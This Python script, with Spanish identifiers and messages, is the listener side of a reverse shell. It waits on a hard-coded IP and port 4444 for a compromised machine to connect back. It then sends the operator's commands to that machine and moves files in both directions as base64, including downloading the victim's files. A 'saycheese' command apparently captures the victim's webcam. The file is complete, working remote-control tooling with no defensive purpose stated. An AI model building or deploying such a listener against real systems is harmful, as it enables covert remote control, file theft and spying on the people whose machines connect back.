import socket, json
import base64

#POO
class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print('[+] Esperando coneccion')
        self.coneccion,addres = listener.accept()
        print('[+] Conectado con '+ str(addres))

    def envio_confiable(self, data):
        print(data)
        json_data = json.dumps(data)
        self.coneccion.send(json_data.encode('utf-8')) 
    
    def recibir_confiable(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.coneccion.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def cmd_remotamente(self,comando):
        self.envio_confiable(comando)
        if comando[0] == "exit":
            self.coneccion.close()
            exit()
        return self.recibir_confiable()

    def escribir_archivo(self, path, contenido):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contenido))
            return '[+] Descarga exitosa'
    
    def leer_archivo(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            comando = input('>> ')
            comando = comando.split(" ")
            try:
                if comando[0] == 'mandar':
                    contenido_file = self.leer_archivo(comando[1])
                    comando.append(contenido_file.decode('utf-8'))
                    #['mandar','ejemplo.txt', 'contenido del archivo'] 
                resultado = self.cmd_remotamente(comando)
                print(f'--> {resultado} <--')

                if comando[0] == 'saycheese':
                    resultado = self.cmd_remotamente(comando)

                if comando[0] == 'download' and 'error' not in resultado:
                    resultado = self.escribir_archivo(comando[1],resultado.encode('utf-8'))
            except Exception:
                resultado = 'error'
            print(resultado)

my_listener = Listener('192.168.88.175',4444)
my_listener.run()